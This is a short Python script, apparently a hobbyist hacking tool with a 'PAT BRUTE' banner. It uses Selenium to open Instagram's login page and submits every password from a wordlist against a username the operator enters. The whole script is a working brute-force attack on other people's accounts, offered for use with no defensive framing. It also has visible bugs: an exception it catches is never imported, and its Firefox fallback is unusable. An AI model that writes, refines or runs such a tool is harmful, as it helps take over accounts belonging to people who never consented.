from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time

green = '\033[32m'
blue = '\033[34m'
yellow = '\033[33m'
resert = '\33[0m'


print(green + """
██████╗  █████╗ ████████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝███████║   ██║       ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██╔══██║   ██║       ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
██║     ██║  ██║   ██║       ██║  ██║██║  ██║╚██████╔╝   ██║   ███████╗
╚═╝     ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝

----------------------[Create by @Jepscrk]-----------------------------
""" + resert)

username_in = input(blue + '[?] Username or email: ' + resert)

try:

	chrome = webdriver.Chrome()
	chrome.get("https://www.instagram.com/")
except WebDriverException:
	firefox = webdriver.Firefox()
	firefox.get("https://www.instagram.com/")

count = 0

time.sleep(5)
try:
    with open("wordlist.txt", "r") as wordlist:
        for i in wordlist:
            try:
                username = chrome.find_element(By.NAME, "username")
                passw = chrome.find_element(By.NAME, "password")
                btn = chrome.find_element(By.CSS_SELECTOR, "button._aswp._aswr._aswu._asw_._asx2")

                username.clear()
                passw.clear()

                username.send_keys(username_in)
                passw.send_keys(i)

                btn.send_keys(Keys.ENTER)
                count += 1 
                print(f"\r{yellow}[{count}] Total number of password: {i}{resert}")

                time.sleep(60)

            except NoSuchElementException:
                print("Did you find it?")
                break
except FileNotFoundError:
    print("Wordlist not found")
